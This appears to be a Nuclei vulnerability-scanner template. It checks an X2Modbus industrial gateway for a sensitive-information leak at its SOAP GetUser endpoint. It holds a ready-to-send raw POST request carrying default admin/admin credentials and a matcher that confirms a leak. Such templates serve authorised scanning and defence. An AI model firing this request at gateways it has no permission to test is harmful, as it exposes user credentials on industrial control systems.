id: X2Modbus-getuser-info

info:
  name: X2Modbus-getuser-info
  author: HB
  severity: medium
  description: 上海迅饶自动化科技有限公司X2Modbus网关GetUser存在敏感信息泄露

http:
  - raw:
    - |
      POST /soap/GetUser HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
      Accept-Encoding: gzip, deflate
      Connection: close
      Upgrade-Insecure-Requests: 1
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 56

      <GetUser><User Name="admin" Password="admin"/></GetUser>

    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 && contains_all(body,"GetUserResult")'